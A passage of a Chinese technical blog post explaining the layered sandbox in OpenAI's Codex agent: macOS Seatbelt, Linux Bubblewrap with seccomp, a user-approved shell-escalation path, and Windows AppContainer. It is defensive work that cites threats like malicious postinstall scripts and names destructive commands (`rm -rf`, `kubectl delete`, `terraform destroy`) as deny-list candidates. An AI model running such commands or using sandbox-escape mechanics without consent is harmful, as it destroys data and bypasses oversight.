+<p><strong>文件系统默认完全不可读不可写</strong>。运行时根据用户配置的 <code>PermissionProfile</code> 动态生成 <code>(allow file-read* (subpath &quot;...&quot;))</code> 和 <code>(allow file-write* (subpath &quot;...&quot;))</code> 规则附加到基础策略后面。可写根目录（writable roots）来自配置，常见是 <code>cwd</code> 和 <code>/tmp</code>。任何不在白名单里的路径，连 <code>stat()</code> 都会失败。</p>
+<p>源码里有一个体现 paranoid 思维的小细节：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// codex-rs/sandboxing/src/seatbelt.rs:25-29</span></span><br><span class="line"><span class="comment">/// When working with `sandbox-exec`, only consider `sandbox-exec` in `/usr/bin`</span></span><br><span class="line"><span class="comment">/// to defend against an attacker trying to inject a malicious version on the</span></span><br><span class="line"><span class="comment">/// PATH. If /usr/bin/sandbox-exec has been tampered with, then the attacker</span></span><br><span class="line"><span class="comment">/// already has root access.</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">const</span> MACOS_PATH_TO_SEATBELT_EXECUTABLE: &amp;<span class="built_in">str</span> = <span class="string">&quot;/usr/bin/sandbox-exec&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这是<strong>硬编码绝对路径</strong>。Codex 不查 PATH，不接受配置覆盖。理由写在注释里：如果攻击者能改 PATH 注入一个假 <code>sandbox-exec</code>，没问题，那一定有 root 才能继续——但这种情况下 <code>/usr/bin/sandbox-exec</code> 也已经被换了，整个机器都已经沦陷，sandbox 是否可信也不重要了。把信任锚点钉死在 <code>/usr/bin</code>，等于把「我相信 macOS 系统目录没被改」这一条假设暴露出来——不能更小，但也别更大。</p>
+<p>启动一条命令时，Codex 实际跑的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;sandbox-exec -p &#39;&lt;动态拼出的 SBPL 策略&gt;&#39; -- &lt;用户命令&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那段策略前面是 <code>seatbelt_base_policy.sbpl</code> 的全文，中间是动态生成的 file-read / file-write / network 段，后面如果开了 <code>restricted_read_only_platform_defaults</code> 还会加一段 macOS 系统路径的只读访问。整套策略以字符串形式直接传给 <code>sandbox-exec</code>，不落盘。</p>
+<hr>
+<h2 id="4-Linux-Bubblewrap：用-Linux-namespaces-拼出来的笼子"><a href="#4-Linux-Bubblewrap：用-Linux-namespaces-拼出来的笼子" class="headerlink" title="4. Linux Bubblewrap：用 Linux namespaces 拼出来的笼子"></a>4. Linux Bubblewrap：用 Linux namespaces 拼出来的笼子</h2><p>Linux 没有 Seatbelt 那种「用一份策略文件描述一切」的官方接口，但它有更底层、更灵活的原料：<strong>namespaces</strong>（命名空间，让进程拥有独立视角的 mount/pid/net/user 等）和 <strong>seccomp-bpf</strong>（系统调用过滤器）。</p>
+<p>把这堆原料组装成一个能用的 sandbox 的工具叫 <strong>Bubblewrap</strong>（GNOME Flatpak 在用的那个，二进制名 <code>bwrap</code>）。Codex 直接调用它。</p>
+<p><code>linux-sandbox</code> 这个 crate 启动一条命令时，构造的命令大致长这样（简化）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bwrap \</span><br><span class="line">  --unshare-user --unshare-pid --unshare-net \</span><br><span class="line">  --ro-bind &#x2F; &#x2F; \</span><br><span class="line">  --bind &#x2F;home&#x2F;leslie&#x2F;proj &#x2F;home&#x2F;leslie&#x2F;proj \</span><br><span class="line">  --ro-bind &#x2F;home&#x2F;leslie&#x2F;proj&#x2F;.git &#x2F;home&#x2F;leslie&#x2F;proj&#x2F;.git \</span><br><span class="line">  --proc &#x2F;proc \</span><br><span class="line">  -- &lt;用户命令&gt;</span><br></pre></td></tr></table></figure>
+
+<p>每一行都在做一件事：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--unshare-user</code></td>
+<td>创建新的 user namespace，进程的 UID 和外面不一样，里面是 root 外面是普通用户</td>
+</tr>
+<tr>
+<td><code>--unshare-pid</code></td>
+<td>创建新的 PID namespace，进程在里面看不到外面其他进程</td>
+</tr>
+<tr>
+<td><code>--unshare-net</code></td>
+<td>创建新的 network namespace，里面没有任何网卡（断网）</td>
+</tr>
+<tr>
+<td><code>--ro-bind / /</code></td>
+<td>把整个根目录以<strong>只读</strong>方式 mount 到沙箱里</td>
+</tr>
+<tr>
+<td><code>--bind &lt;root&gt; &lt;root&gt;</code></td>
+<td>把指定目录改成可读可写（在 ro-bind 上面叠加）</td>
+</tr>
+<tr>
+<td><code>--ro-bind &lt;protected&gt;</code></td>
+<td>把可写目录里的敏感子路径（<code>.git</code>、<code>.codex</code>）再覆盖回只读</td>
+</tr>
+<tr>
+<td><code>--proc /proc</code></td>
+<td>在沙箱里挂一个新的 procfs，避免泄露宿主进程信息</td>
+</tr>
+</tbody></table>
+<p>这一套组合的语义是<strong>默认全只读 + 显式开窗口</strong>。一个写权限是这样获得的：先 <code>--ro-bind / /</code> 把整个根都封死，再 <code>--bind /home/leslie/proj /home/leslie/proj</code> 把工作目录单独开放，再 <code>--ro-bind /home/leslie/proj/.git /home/leslie/proj/.git</code> 把 <code>.git</code> 重新封回只读（防止 AI 改 hooks 或 history）。</p>
+<p>Codex 在拼装 bwrap 参数时<strong>按路径特异性排序</strong>——窄路径的规则放后面挂载，从而覆盖前面挂的宽路径规则。下面这三条规则叠在一起，结果是 <code>/repo</code> 可写、<code>/repo/a</code> 拒绝、<code>/repo/a/b</code> 又可写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--bind     &#x2F;repo        &#x2F;repo         # 1. 整个 &#x2F;repo 可写</span><br><span class="line">--ro-bind  &#x2F;dev&#x2F;null    &#x2F;repo&#x2F;a       # 2. 屏蔽 &#x2F;repo&#x2F;a（用 &#x2F;dev&#x2F;null 覆盖）</span><br><span class="line">--bind     &#x2F;repo&#x2F;a&#x2F;b    &#x2F;repo&#x2F;a&#x2F;b     # 3. 重新打开 &#x2F;repo&#x2F;a&#x2F;b 可写</span><br></pre></td></tr></table></figure>
+
+<p><img src="illustrations/C4-Bubblewrap-mount%E5%8F%A0%E5%8A%A0.webp" alt="Linux Bubblewrap 的 mount 叠加：默认全只读，按路径特异性逐层开窗口"></p>
+<p>进入 bwrap 之后还有两件事在 in-process 做：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// codex-rs/linux-sandbox/README.md</span></span><br><span class="line">- When bubblewrap is active, the helper applies `PR_SET_NO_NEW_PRIVS` and a</span><br><span class="line">  seccomp network filter <span class="keyword">in</span>-process.</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>PR_SET_NO_NEW_PRIVS</code></strong> 是 Linux 3.5（2012 年）引入的进程标志，设了之后这个进程及其所有子进程都不能通过 <code>execve</code> 提权（setuid 二进制无效化、Linux capabilities 不能新增）。等于把「执行 <code>sudo</code>、<code>su</code>、<code>mount</code> 这种 setuid 程序」这条提权路径整体废掉。</p>
+<p><strong>Seccomp 网络过滤</strong>。这里用到的 <strong>seccomp-bpf</strong>（secure computing mode + BPF 过滤器）是 Linux 内核机制，可以按 syscall 编号和参数白名单或黑名单 syscall。当网络被禁时，bwrap 已经给了一个空的 net namespace（无网卡），但 Codex 还要叠一道 seccomp 拦截 <code>socket()</code>、<code>socketpair()</code> 等创建套接字的调用，作为 namespace 的二次保险。即使代码里调用 <code>socket(AF_INET, ...)</code> 也会直接 <code>EPERM</code>。</p>
+<h3 id="Bubblewrap-自己的安全防御"><a href="#Bubblewrap-自己的安全防御" class="headerlink" title="Bubblewrap 自己的安全防御"></a>Bubblewrap 自己的安全防御</h3><p>Codex 在选择 <code>bwrap</code> 二进制时也很小心。<code>codex-rs/sandboxing/src/bwrap.rs:168</code> 里的 <code>find_system_bwrap_in_path()</code> 干这件事：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">which::which_in_all(SYSTEM_BWRAP_PROGRAM, <span class="literal">Some</span>(search_path), &amp;cwd)</span><br><span class="line">    .ok()?</span><br><span class="line">    .find_map(|path| &#123;</span><br><span class="line">        <span class="keyword">let</span> path = std::fs::canonicalize(path).ok()?;</span><br><span class="line">        <span class="keyword">if</span> !cwd_is_root &amp;&amp; path.starts_with(&amp;cwd) &#123;</span><br><span class="line">            <span class="literal">None</span>  <span class="comment">// ← 拒绝任何在当前工作目录下找到的 bwrap</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="literal">Some</span>(path)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>搜 bwrap 的时候，主动跳过当前工作目录下的命中</strong>。攻击场景：你 <code>cd</code> 进了某个不可信的项目，项目里有个 <code>./bwrap</code> 是恶意脚本，PATH 又恰好包含 <code>.</code>（虽然不该有但确实有人这么配）。如果 Codex 直接用 <code>which bwrap</code> 拿到 <code>./bwrap</code>，那这个项目就能控制 sandbox 本身。所以 Codex 主动把 cwd 排除掉，逼自己用 <code>/usr/bin/bwrap</code> 这种系统路径。</p>
+<p>如果系统压根没装 bwrap，Codex 还自带一份：<code>codex-rs/bwrap/</code> 这个 crate 编进去一份 bundled <code>bwrap</code> 二进制作为兜底，避免在没装 bubblewrap 的发行版上完全失效。</p>
+<p>启动前还有一道<strong>能力探测</strong>：通过跑一次 <code>bwrap --help</code> 看输出里有没有 <code>--argv0</code>（v0.9.0 引入）和 <code>--perms</code>，决定走哪条兼容路径。Ubuntu 20.04 / 22.04 自带的 bwrap 太老不支持 <code>--argv0</code>，Codex 不会假装它支持，而是切到「不带 <code>--argv0</code>」的兼容路径。</p>
+<p>还有一道<strong>用户命名空间可用性探测</strong>：Docker、有些公司的 Linux 加固镜像、WSL1 都禁用了 user namespace。Codex 在启动时跑一次 <code>bwrap --unshare-user --unshare-net --ro-bind / / /bin/true</code>，超时 500ms，看能不能成功。失败了就提前在 TUI 顶上挂一行警告：「你的环境不支持 user namespace，sandbox 不会生效」。WSL1 因为根本不支持 user namespace，Codex 直接拒绝跑。</p>
+<hr>
+<h2 id="5-Shell-内拦截：用户主动批准的「越狱」"><a href="#5-Shell-内拦截：用户主动批准的「越狱」" class="headerlink" title="5. Shell 内拦截：用户主动批准的「越狱」"></a>5. Shell 内拦截：用户主动批准的「越狱」</h2><p>前面四层都在收紧。第五层反过来——给用户一个明确同意之后<strong>跳出 sandbox</strong> 的口子。</p>
+<p>场景是这样的：你在 sandbox 里跑命令，AI 想 <code>git push origin main</code>。push 需要 SSH key，SSH key 在 <code>~/.ssh/</code>，但 <code>~/.ssh/</code> 不在可写根里，连读都不行。怎么办？</p>
+<p><code>codex-rs/shell-escalation/</code> 的设计是：<strong>一个 patched zsh + 一个 wrapper 二进制 + 一个 IPC 协议</strong>。</p>
+<p><img src="illustrations/C5-Shell-Escalation-fd%E8%BD%AC%E7%A7%BB.webp" alt="Shell escalation：patched zsh → execve-wrapper → escalation server，通过 SCM_RIGHTS 把 fd 转交到 sandbox 外的进程"></p>
+<p>对应的执行链路：</p>
+<ol>
+<li>Codex 启动一个 shell，但不是普通的 zsh，是一个<strong>打了补丁的 zsh</strong>（patch 在 <code>codex-rs/shell-escalation/patches/zsh-exec-wrapper.patch</code>，给 zsh 的 <code>Src/exec.c</code> 加了一个 <code>EXEC_WRAPPER</code> 钩子）。</li>
+<li>这个 zsh 每次要 fork-exec 子进程之前，先 <code>execve</code> 一个 wrapper 程序 <code>codex-execve-wrapper</code>，把原命令的参数传进去。</li>
+<li>wrapper 通过环境变量 <code>CODEX_ESCALATE_SOCKET</code> 拿到一个文件描述符（<strong>fd</strong>，file descriptor），通过这个 fd 和 Codex 主进程上的 escalation server 通信，发送「我要跑这条命令，要怎么处理？」</li>
+<li>server 看一眼命令、走一遍 execpolicy、可能弹给用户人工确认，回三种之一：</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>响应</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Run</code></td>
+<td>在 sandbox 内正常跑——wrapper 自己 <code>execve</code> 原命令</td>
+</tr>
+<tr>
+<td><code>Escalate</code></td>
+<td>跳出 sandbox 跑——server 接管 fd，在 sandbox 外执行，跑完把 exit code 转回去</td>
+</tr>
+<tr>
+<td><code>Deny</code></td>
+<td>拒绝——wrapper 打印错误，exit 1</td>
+</tr>
+</tbody></table>
+<p><strong>这里精彩的地方在 fd 转移</strong>。”escalate” 不是简单地把命令 fork 到 sandbox 外面就完事，而是要把 stdin / stdout / stderr 这三个 fd 透明地传到 sandbox 外的进程上，让它的输入输出和原本在 sandbox 内的语义完全一致。Linux 上这通过 <code>SCM_RIGHTS</code>（<strong>ancillary message</strong>，可以在 Unix domain socket 上传 fd 给另一个进程的内核机制）实现。这是这个设计的核心 trick——它让「跳出 sandbox」从用户视角看是无感的，命令的输出还是流式回到原来的终端。</p>
+<p>这一层是 Codex 区别于其他 AI agent 的一个隐藏功能：<strong>不是简单地”关 sandbox”或”开 sandbox”，而是允许 sandbox 内的某条命令例外性地跳出来执行</strong>。从架构上讲，它解决的是「sandbox 太严会卡死真实工作流，sandbox 太松又失去意义」这个根本矛盾。</p>
+<hr>
+<h2 id="6-Windows：完全不一样的一套"><a href="#6-Windows：完全不一样的一套" class="headerlink" title="6. Windows：完全不一样的一套"></a>6. Windows：完全不一样的一套</h2><p>到这里你可能注意到：上面四层都是 Unix 的。Windows 整个生态没有 namespace、没有 seccomp、没有 sandbox-exec。Codex 在 Windows 上走的是<strong>完全不同的一套</strong>机制。</p>
+<p><img src="illustrations/C6-Windows%E6%B2%99%E7%AE%B14%E4%BB%B6%E5%A5%97.webp" alt="Windows 沙箱 4 件套：AppContainer + Restricted Token + Job Object + Window Filtering Platform"></p>
+<p><code>codex-rs/windows-sandbox-rs/</code> 的源码体量比 Linux 还大，主要靠这几个 Windows 特性：</p>
+<ul>
+<li><strong>AppContainer</strong>：Windows 8 引入的应用隔离机制，原本给 UWP / Edge 用的。每个 AppContainer 进程有独立的 SID（<strong>Security Identifier</strong>），按 SID 给的 ACL（<strong>Access Control List</strong>，文件/注册表的访问控制列表）来决定能访问什么。</li>
+<li><strong>Restricted Token</strong>：把进程的访问令牌”减权”，去掉 admin 组、去掉危险的特权（<code>SeDebugPrivilege</code> 之类），只留必需的 SID。</li>
+<li><strong>Job Object</strong>：把进程绑到一个 job，限制它能创建多少子进程、能用多少内存、能存活多久。</li>
+<li>**Window Filtering Platform (WFP)**：Windows 内核里的网络过滤框架，Codex 用它实现网络访问的细粒度控制（<code>wfp.rs</code>、<code>wfp_setup.rs</code>），相当于给这个 sandbox 单独装了一道防火墙。</li>
+<li><strong>私有 Desktop</strong>：可选地把 sandbox 进程放到一个独立的 Windows Desktop 对象上，让它不能截屏、不能模拟键盘输入到主桌面。</li>
+</ul>
+<p>构造方法上也很不一样。Linux 的 bwrap 是「fork + namespace + exec」，所有隔离在子进程的 namespace 里。Windows 的 AppContainer 是「按 SID 配 ACL + 用 restricted token 启动进程」，所有隔离在 NT 内核的访问控制里。两套机制都能达到「文件系统沙箱 + 网络隔离 + 提权阻断」的效果，但思路完全不同。</p>
+<p>Codex 在 Windows 上还做了一些 Linux 用户想象不到的事情：**<code>hide_users.rs</code>** 在 sandbox 启动时枚举宿主上的用户账户，从 sandbox 视角隐藏掉，避免 AI 通过 <code>net user</code> 之类的命令枚举到其他用户存在；**<code>ssh_config_dependencies.rs</code>** 专门处理 OpenSSH 在 Windows 上的配置依赖，因为 SSH 的 known_hosts 默认在 <code>%USERPROFILE%\.ssh\</code> 而 sandbox 内的 home 是被重映射的。</p>
+<p>Windows sandbox 看起来是 Codex 三个平台里近期改动最活跃的一块。如果你打算从这里改起，可以预期 git log 上的 churn 比 Linux 那块明显多——这意味着你既能赶上新设计，也要做好接住未稳定接口的准备。</p>
+<hr>
+<h2 id="7-几个聪明的设计决策"><a href="#7-几个聪明的设计决策" class="headerlink" title="7. 几个聪明的设计决策"></a>7. 几个聪明的设计决策</h2><p>把上面五层串起来再观察，能看到一些贯穿全栈的设计取舍。</p>
+<p><strong>纵深防御（Defense in Depth）</strong>。任何一层都不假设自己是最后一道防线。execpolicy 拦掉的命令，sandbox 也会再拦一次（防止规则文件被篡改）；sandbox 隔离的网络，seccomp 也会再封一次（防止 namespace 被绕）；进程加固关掉的 ptrace，sandbox 内的 <code>PR_SET_NO_NEW_PRIVS</code> 也再次禁了 setuid 提权。冗余不是浪费，是兜底。</p>
+<p><strong>默认全拒，显式放行</strong>。从 <code>(deny default)</code> 到 <code>--ro-bind / /</code> 到 execpolicy 的「未匹配等于不放行」，整条链路上每一层都遵守同一个规则：白名单只比黑名单严一点点，但安全性不在一个量级。</p>
+<p><strong>信任锚点钉死在系统目录</strong>。<code>/usr/bin/sandbox-exec</code> 硬编码、bwrap 主动拒绝 cwd 路径下的二进制、execpolicy 用 <code>host_executable</code> 限制绝对路径回退。这背后是同一个判断：<strong>配置可以被攻击者改，环境变量可以被攻击者改，PATH 可以被攻击者改，但是改 <code>/usr/bin/</code> 需要 root，到那一步整个机器已经丢了</strong>。把信任建立在「需要 root 才能破坏」的东西上，比建立在「任何同 UID 进程都能破坏」的东西上安全得多。</p>
+<p><strong>能力探测优先于假设</strong>。bwrap 是不是支持 <code>--argv0</code>、是不是有 user namespace 权限、机器是不是 WSL1，全是运行时探测出来的，不是猜的。这看上去琐碎，但意味着 Codex 在不同发行版、不同内核版本、不同容器化环境里都不会因为一个小差异就崩。</p>
+<p><strong>警告前置</strong>。bwrap 缺了、user namespace 没权限、WSL1 不能跑 sandbox，这些问题 Codex 在启动时就探测出来在 TUI 顶上挂横幅，而不是等用户跑了一条命令才在 stderr 喷一段晦涩的内核错误。这是把 UX 当成安全功能的一部分来设计——一个用户看不懂的安全警告，等于没有警告。</p>
+<p><strong>给”用户主动越狱”留口子</strong>。shell-escalation 是这套架构里我最喜欢的一块。它承认了「绝对的隔离会让工具不可用」这件事，同时设计了一个明确的、有人工同意的、可审计的越狱路径。让安全策略可执行的关键，从来不是把规则定到最严，而是给合理的例外留出口。</p>
+<hr>
+<h2 id="8-总结：一张表回顾，加上几个二开方向"><a href="#8-总结：一张表回顾，加上几个二开方向" class="headerlink" title="8. 总结：一张表回顾，加上几个二开方向"></a>8. 总结：一张表回顾，加上几个二开方向</h2><p>整套 Codex sandbox 拦截链路按命令的流向走一遍：</p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>在哪一层</th>
+<th>谁的代码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1. Codex 进程启动</td>
+<td>进程加固</td>
+<td><code>process-hardening</code> 的 <code>pre_main_hardening()</code></td>
+</tr>
+<tr>
+<td>2. AI 决定执行某条命令</td>
+<td>（还没拦截）</td>
+<td><code>core</code></td>
+</tr>
+<tr>
+<td>3. 命令送进策略检查</td>
+<td>execpolicy</td>
+<td><code>execpolicy::check()</code></td>
+</tr>
+<tr>
+<td>4. 决定走 sandbox</td>
+<td>sandboxing</td>
+<td><code>SandboxManager::transform()</code></td>
+</tr>
+<tr>
+<td>5. macOS 走 seatbelt / Linux 走 bwrap / Windows 走 AppContainer</td>
+<td>平台 sandbox</td>
+<td><code>sandboxing::seatbelt</code> / <code>linux-sandbox</code> / <code>windows-sandbox-rs</code></td>
+</tr>
+<tr>
+<td>6. 内核级隔离</td>
+<td>namespaces + seccomp + AppContainer</td>
+<td>Linux/Windows 内核</td>
+</tr>
+<tr>
+<td>7. sandbox 内 shell 想 fork 子进程</td>
+<td>shell-escalation</td>
+<td><code>codex-execve-wrapper</code></td>
+</tr>
+<tr>
+<td>8. （可选）跳出 sandbox 执行</td>
+<td>shell-escalation server</td>
+<td>escalation IPC + fd 转移</td>
+</tr>
+</tbody></table>
+<p>每一层都对应着一类具体威胁、用着对应平台上<strong>最贴近内核的那个机制</strong>、并且<strong>默认全拒</strong>。</p>
+<p>回到文章开头那条 <code>rm -rf node_modules &amp;&amp; pnpm install</code>：</p>
+<ul>
+<li>进程加固层确认 Codex 进程本身没被同 UID 攻击者劫持</li>
+<li>execpolicy 检查 <code>rm -rf</code> 是否触发了规则——可能是 <code>prompt</code>，弹给你确认</li>
+<li>你点了 yes，sandbox 启动</li>
+<li>macOS 上：<code>sandbox-exec</code> 把 <code>rm</code> 关进只读根 + 你工作目录可写的 SBPL 策略里，任何越界访问都被内核拒绝</li>
+<li>Linux 上：bwrap 给 <code>rm</code> 一个新的 user/pid/net namespace，根目录只读，工作目录可写，没有网络</li>
+<li><code>pnpm install</code> 想跑的恶意 postinstall 脚本，没有网络（除非允许）、没法读 <code>~/.ssh/</code>、没法 <code>sudo</code>、没法 <code>LD_PRELOAD</code> 注入到任何东西</li>
+</ul>
+<p>每一层单看都不复杂，叠在一起就是一个外人想攻破 Codex 至少得过五道关的纵深防御体系。</p>
+<hr>
+<p>如果你想基于 Codex 做 sandbox 方向的二次开发，自然的几个方向：</p>
+<p><strong>写一份公司专属的 execpolicy</strong>。最小成本的改造。在 <code>codex-rs/execpolicy/examples/</code> 旁边新建你公司的 <code>corp.codexpolicy</code>，把内部认为危险的命令（比如 <code>kubectl delete</code>、<code>terraform destroy</code>、改某些机密文件）单独标 forbidden 或 prompt。配合 <code>--rules</code> 参数加载，立刻生效，不需要碰任何 Rust 代码。</p>
+<p><strong>接审计日志</strong>。execpolicy 的所有决策都是结构化 JSON，你可以在 <code>codex-rs/sandboxing/src/manager.rs</code> 的 <code>transform()</code> 里加一道 hook，把每条命令的决策、justification、命中规则写到公司内部审计系统（SLS、ELK、splunk 都行）。</p>
+<p><strong>抽出 sandbox 模块独立成库</strong>。<code>codex-rs/sandboxing/</code> 这个 crate 设计上和 codex 业务耦合很轻，主要依赖 <code>codex-protocol</code> 的 <code>SandboxPolicy</code> 类型。你可以把它 fork 出来作为公司内部所有需要”在自家机器上跑不可信代码”的项目的统一 sandbox 库——典型场景：CI runner、AI 数据处理 pipeline、用户上传脚本执行平台。</p>
+<p><strong>给特定语言加更紧的 policy</strong>。Python <code>pip install</code> 的 setup.py 任意代码执行、Node <code>pnpm install</code> 的 postinstall 脚本，本质上是 sandbox 没区分「运行代码」和「构建代码」。可以在 execpolicy 之上叠一层语言特化策略：跑 <code>pip</code> 时强制 <code>--require-hashes</code>、跑 <code>pnpm</code> 时强制 <code>--ignore-scripts</code>，等等。</p>
+<p>最难的其实不是写代码，是定义清楚你公司的「可接受的风险」是什么。Codex 默认策略反映的是 OpenAI 自己的风险模型——给云上 ChatGPT 用户提供一个公开的、对抗 prompt injection 的本地代理。你公司的风险模型可能完全不同：内部数据敏感度更高、外网访问要走公司 proxy、命令审计要进合规系统、不同部门需要不同的策略集合……这些都是 Codex 默认策略给不了你答案的事情，但它给了你一个能回答这些问题的好底座。</p>
+<hr>
+<blockquote>
+<p>参考资料</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/openai/codex/tree/main/codex-rs/sandboxing">Codex sandbox 源码</a> - 本文主要拆解对象</li>
+<li><a target="_blank" rel="noopener" href="https://developers.openai.com/codex/security">Codex 官方 sandbox 文档</a> - 用户视角的能力描述</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/containers/bubblewrap">Bubblewrap 项目</a> - GNOME Flatpak 在用的同一个 bwrap</li>
+<li><a target="_blank" rel="noopener" href="https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf">Apple Sandbox SBPL 第三方文档</a> - Apple 没出官方文档，这是社区最完整的整理</li>
+<li><a target="_blank" rel="noopener" href="https://lwn.net/Articles/532593/">Linux User Namespaces (LWN)</a> - user namespace 的权威介绍</li>
+<li><a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/mac/">Chrome 的 macOS sandbox 配置</a> - Codex SBPL 策略的参考来源</li>
+</ul>
+</blockquote>
+</div>
+    <aside class="post-rail">
+      <span class="post-rail__line"></span>
+      <span>LESLIE / WRITING</span>
+    </aside>
+  </div>
+
+  <footer class="post-footer shell">
+    <div><h2>如果这篇文章帮到了你，<br>也许下一篇会更有意思。</h2></div>
+    <a class="button button--primary" href="/writing/">继续阅读 →</a>
+  </footer>
+</article>
+</main>
+    <footer class="site-footer">
+  <div class="footer-grid">
+    <div>
+      <p class="footer-kicker">Leslie Zhang</p>
+      <p class="footer-statement">流水不争先，<br>争的是滔滔不绝。</p>
+    </div>
+    <div class="footer-links">
+      <a href="https://github.com/leslieAIbin" target="_blank" rel="noreferrer">GitHub ↗</a>
+      <a href="https://www.instagram.com/leslieaibin/" target="_blank" rel="noreferrer">Instagram ↗</a>
+      <button type="button" data-wechat-open>微信 / WeChat</button>
+      <a href="mailto:aibinzhangleslie@gmail.com">Email ↗</a>
+      <a href="/atom.xml">RSS ↗</a>
+    </div>
+    <div class="footer-meta">
+      <span>© 2026 Leslie Zhang</span>
+      <span>Writing, research and working systems.</span>
+    </div>
+  </div>
+</footer>
+
+    <dialog class="ask-dialog" id="ask-leslie" aria-labelledby="ask-title">
+  <div class="ask-dialog__shell">
+    <div class="ask-dialog__topbar">
+      <div>
+        <h2 id="ask-title">Ask Leslie</h2>
+      </div>
+      <button class="icon-button" type="button" data-ask-close aria-label="关闭">×</button>
+    </div>
+    <p class="ask-dialog__intro">从本站公开文章中寻找答案。当前版本在浏览器本地检索，不上传问题，也不会编造不存在的经历。</p>
+    <form class="ask-form" data-ask-form>
+      <label class="sr-only" for="ask-query">输入问题</label>
+      <textarea id="ask-query" rows="2" placeholder="例如：Agent Runtime 应该怎么设计？" data-ask-input></textarea>
+      <button type="submit">检索知识库 <span aria-hidden="true">↗</span></button>
+    </form>
+    <div class="ask-suggestions" aria-label="推荐问题">
+      
+        <button type="button" data-ask-suggestion="Agent Runtime 应该怎么设计？">Agent Runtime 应该怎么设计？</button>
+      
+        <button type="button" data-ask-suggestion="如何让 AI 操控真实世界设备？">如何让 AI 操控真实世界设备？</button>
+      
+        <button type="button" data-ask-suggestion="Leslie 最近在研究什么？">Leslie 最近在研究什么？</button>
+      
+    </div>
+    <div class="ask-results" data-ask-results aria-live="polite">
+      <div class="ask-empty">
+        <p>输入一个问题，我会把你带到 Leslie 写过的相关内容。</p>
+      </div>
+    </div>
+  </div>
+</dialog>
+
+    <dialog class="wechat-dialog" id="wechat-leslie" aria-labelledby="wechat-title">
+  <div class="wechat-dialog__shell">
+    <header>
+      <div>
+        <p class="section-label">WeChat</p>
+        <h2 id="wechat-title">微信联系</h2>
+      </div>
+      <button class="icon-button" type="button" data-wechat-close aria-label="关闭微信二维码">×</button>
+    </header>
+    <img src="/images/contact/wechat-leslie.png" alt="Leslie Zhang 的微信二维码" loading="lazy">
+    <p>扫码添加 Leslie，建议备注你的名字与来意。</p>
+  </div>
+</dialog>
+
+    <script>window.ORBITAL_ROOT = '/';</script>
+    <script src="/js/orbital.js" defer></script>
+  </body>
+</html>
